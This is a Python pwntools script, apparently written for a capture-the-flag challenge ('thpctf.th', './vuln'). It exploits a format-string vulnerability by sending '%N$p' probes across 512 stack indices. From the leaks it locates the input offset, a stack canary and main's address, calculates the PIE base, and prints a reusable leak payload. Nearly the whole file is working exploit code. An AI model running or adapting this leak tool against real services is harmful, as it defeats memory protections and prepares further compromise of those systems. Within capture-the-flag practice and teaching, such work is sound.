import sys
from pwn import *

global BINARY 

#=====[ Target Segment ]=====#
SERV = 'thpctf.th'
PORT = 6767
REMOTE = True
BINARY = './vuln' 
#============================#
elf = context.binary = ELF(BINARY)
# context.log_level = "error"  #aktifkan jika gamau liat info log

def start():
    global REMOTE
    if args.LOCAL or not REMOTE:
        p = process(BINARY,level='critical')
    else:
        try:
            p = remote(SERV,PORT)
        except Exception as e:
            REMOTE = False
            p = process(BINARY)
            log.warn("Cannot remote server...trying local.")
            
    return p


def indexl():
    main = hex(elf.sym.main)
    targ = 512

    payload = ''
    log = ''
    leaked = ''
    log += f'\n{text.red('='*50)}\n{'  TIPE':<15}{'INDEX':<20}{'ADDRESS'}\n{text.red('='*50)}'
    i = 0

    while True:
        i += 1
        pay = f"AAAABBBB%{i}$p"
        p = start()

            #===[ sendline segment 1 ]===#
        p.recvuntil(b': ')
        p.sendline(pay.encode())

            #===[ recvline segment 1 ]===#
        p.recvuntil(b'BBBB')
        try:
            leak = int(p.recvline().strip().decode(),16)
            leaked += f'\n{text.green(f'index {i :<5}')} : {text.bold_yellow(hex(leak))}'

            leak = str(hex(leak))

            #==========[ START INDEX ]==========#
            if '424242' in leak:
                log += f'\n{"":<2}{'start input':<15}{i:<15}{leak:<20}{unhex(leak.replace('0x',''))}'
                payload += f'.%{i}$p'
            
            #==========[ BASE ]==========#
            # if leak[-3:] == '000':
            #     log += f"\n{'':<2}{'Base':<15}{i:<15}{leak}"
            #     payload += f'.%{i}$p'

            #==========[ PIE ]==========#
            # if leak.startswith(('0x4','0x5','0x6')):
            #     log += f"\nfound PIE : {i} : {leak}"
            #     payload += f'.%{i}$p'

            #==========[ CANARY ]==========#
            if leak[-2::] == '00' and len(leak) == 18:
                log += f"\n{'':<2}{text.bold_red('canary'):<23}{i:<15}{text.bold_yellow(leak)}"

            #==========[ MAIN / BASE ]==========#
            if leak.endswith(main[-3:]):
                log += f"\n{'':<2}{text.green('Main'):<23}{i:<15}{text.bold_yellow(leak)}"
                payload += f'.%{i}$p'
                calculated_base = int(leak,16) - elf.sym.main
                log += f"\n{'':<2}{text.green('BASE (calc)'):<23}{'-':<15}{text.bold_yellow(hex(calculated_base))}"
        except:
            p.close()
    
        if i == targ:
            break
    
        p.close()
    log += f'\n{text.red('='*50)}'
    log += f'\n{text.bold_green("FORMAT STRING PAYLOAD  :")}'
    log += f'\n{text.bold_yellow(payload)}'
    log += f'\n{text.bold_red('='*50)}'
    print(leaked)
    print(log)
    


def main():
    p = log.progress('See Index Tools')
    p.status("indexing")
    indexl()
    start()


if __name__ == "__main__":
    main()
